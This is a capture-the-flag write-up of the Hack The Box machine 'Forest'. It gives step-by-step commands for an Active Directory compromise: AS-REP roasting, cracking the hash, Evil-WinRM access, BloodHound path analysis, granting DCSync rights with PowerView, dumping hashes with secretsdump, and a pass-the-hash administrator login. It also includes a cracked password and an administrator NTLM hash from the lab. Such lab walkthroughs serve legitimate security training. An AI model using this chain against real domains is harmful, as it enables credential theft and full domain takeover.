---
description: https://www.hackthebox.eu/home/machines/profile/212
---

# Forest

This box is rated as easy which in my opinion is not accurate. This box is rather difficult if you have little experience is pentesting Active Directory. This box should really be at least a medium.

![](<../../../.gitbook/assets/image (312).png>)

## Nmap

```
kali@kali:~$ sudo nmap 10.10.10.161 -p- -sS -T4 -sV -v 

PORT      STATE SERVICE      VERSION

53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-11-07 16:52:24Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49703/tcp open  msrpc        Microsoft Windows RPC
49940/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### OS Dsicovery

Since we have SMB open lets check with the `nmap` OS discovery script.

```
nmap 10.10.10.161 --script smb-os-discovery
```

![](<../../../.gitbook/assets/image (313).png>)

From this we are able to obtain the machine domain and host name information. This is important as looking at the initial `nmap` results we are almost certainly dealing with a domain controller.

## RPC Client

Since we have msrpc open on TCP 135 lets see if we can connect with `rpcclient` without specifying any credentials.

```
rpcclient -N -U "" forest.htb.local
```

We are able to connect. From here lets start enumerating information starting with domain users.

![](<../../../.gitbook/assets/image (314) (1).png>)

And domain groups

![](<../../../.gitbook/assets/image (316) (1).png>)

I will clean up the enumeration user accounts list to just contain actual users accounts and store them in a text file so we can AS-REP roast them.

```
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

We can use the Impacket python script GetPNUsers.py against our user list to see if we have any accounts with the "Do not use kerberos preauthentication" box in Active Directory unchecked.

![](<../../../.gitbook/assets/image (317).png>)

```
sudo python /opt/impacket-0.9.19/examples/GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb.local/ -usersfile /home/kali/users.txt
```

After a short while the script returns the results below where we have the account "svc-alfresco" that does not require Kerberos preauthentication enabled and we have pulled a NTLMv2 hash.

![](<../../../.gitbook/assets/image (318).png>)

Store this hash in a file and we can run it against John The Ripper and see if we can crack it.

```aspnet
sudo john --wordlist=/usr/share/wordlists/rockyou.txt /home/kali/kerberoshash
```

![](<../../../.gitbook/assets/image (319).png>)

We have cracked the password of "s3rvice" using the rockyou.txt wordlist.

I used the obtained credentials with `smbmap` to see what shares we have access to and was only presented with read access to NETLOGON and SYSVOL shares.

![](<../../../.gitbook/assets/image (320) (1).png>)

I executed the same command as above this time with the switch `-R` for recursive. We did not pick up anything interesting. I was hoping for exposed GPP credentials in SYSVOL.

![](<../../../.gitbook/assets/image (321) (1).png>)

Going back to the `nmap` results, port 5985 is now relevant to us as we have some credentials that might work. Port 5985 is used for Windows remote management and Powershell remoting.

The best suggested tool for penetration testing on this port is a tool called Evil-WinRM which is a remote management tool based around hacking and pentesting. You can find the GitHub linked below:

{% embed url="https://github.com/Hackplayers/evil-winrm" %}

**Installation:**

```
gem install evil-winrm
```

When attempting to run with no arguments we can see the help menu.

![](<../../../.gitbook/assets/image (323).png>)

Using the account credentials we obtained earlier we can log in with Evil-WinRM.

```
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

![](<../../../.gitbook/assets/image (324) (1).png>)

From here we can access the user flag.

![](<../../../.gitbook/assets/image (325).png>)

## Privilege Escalation

Now that we have the user flag we can begin to work on escalating our privileges.

At this point I had a really good look around the machine and could not find anything that stood out for a privilege escalation route. I will instead use `Bloodhound` to help identify a route for escalation.

### Bloodhound

We can use the Sharphound implementation of the Bloodhound ingestor found to pull the information we need.

{% embed url="https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1" %}

Upload the SharpHound.exe file using Evil-WinRM.

![](<../../../.gitbook/assets/image (326).png>)

Now we need to execute the binary from Evil-WinRM.

```
cmd.exe /c .\SharpHound.exe
```

![](<../../../.gitbook/assets/image (327) (1).png>)

Once completed we can download the zip file to our attacking machine.

![](<../../../.gitbook/assets/image (328).png>)

This write up will not cover installing and setting up Bloodhound. A simple and to the point guide is available here:

{% embed url="https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/" %}

Once we have the zip file we can drop it into Bloodhound and wait for it to process.

#### Bloodhound Graph

Once the data has been loaded in Bloodhound we can set our starting node as the service account \_svc-alfresco@HTB.local \_and our target node as _Administrator@HTB.local_

![](<../../../.gitbook/assets/image (331).png>)

Looking at the graph starting from the \_svc-alfresco \_service account we have the following information.

We are a member of the _Service Accounts_ group which is a member of _Privileged IT Accounts_ which is a member of Account Operators which has write permissions to the group _Exchange Windows Permissions._

To break this down:

The account _svc-alfesco_ has membership rights leading up to the _Account Operators_ group.

![](<../../../.gitbook/assets/image (333).png>)

The group \_Account Operators \_has the permission "GenericAll" to the group _Exchange Windows Permissions_

![](<../../../.gitbook/assets/image (334).png>)

The _Account Operators_ group in Windows has the ability to create accounts and since according to `Bloodhound` we can write permissions to the _Exchange Windows Permissions_ group we can add our newly created account into this group.

If you right click the line or "edge" between the two groups you can access a help menu which will let us know how to abuse this.

![](<../../../.gitbook/assets/image (336).png>)

![](<../../../.gitbook/assets/image (337) (1).png>)

I actually had issues with the PowerView command `Add-DomainGroupMember` not running as expected so instead I used `net.exe` to complete this process.

We can start by creating a new user account:

```
net user /add Akimbo Password123
```

We then add the new account to the _Exchange Windows Permissions_ Group.

```aspnet
net group "Exchange Windows Permissions" Akimbo /add /DOMAIN
# Verify the account has been added to the group
net group "Exchange Windows Permissions"
```

To illustrate where we are now in terms of shortest path to Domain Admin or Administrator I have run Bloodhound again showing the new account we have made.

![](<../../../.gitbook/assets/image (341) (1).png>)

If we now look at the edge information between the Exchange Windows Permissions Groups and _HTB.LOCAL_ we see the following under the advised abuse information.

![](<../../../.gitbook/assets/image (342).png>)

We need to upload [PowerView ](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1)to the server so we can use the `Add-DomainObjectAcl` command. Upload PowerView using the `upload` command in Evil-WinRM.

![](<../../../.gitbook/assets/image (338) (1).png>)

Once uploaded load the PowerView Powershell script and run the following commands:

{% hint style="info" %}
When using Evil-WinRM you can load Powershell scripts by simply by typing the name of the script as a command (Providing you are in the same directory as the script)
{% endhint %}

```aspnet
$SecPassword = ConvertTo-SecureString 'Password123' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\Akimbo', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'htb.local\exchange windows permissions' -principalidentity 'Akimbo' -Rights DCSync
```

Add-DomainObjectAcl does not have any completed return output. If you receive no errors after running then this has likely worked.

Now that we have an account with the DCSync rights we can use Impacket's secretsdump.py script to Sync the Domain Controller remotely and capture the domain hashes. Run the following command to run the script:

```aspnet
impacket-secretsdump htb.local/akimbo:Password123@10.10.10.161
```

![](<../../../.gitbook/assets/image (343) (1).png>)

We can see from the first result we have the administrators hash. We can use a pass the hash attack with this hash to login to Evil-WinRM as the administrator account.

Evil-WinRM will accept a hash instead of a password using the `-p` switch.

```aspnet
evil-winrm -u administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 -i forest.htb.local
```

![](<../../../.gitbook/assets/image (344).png>)
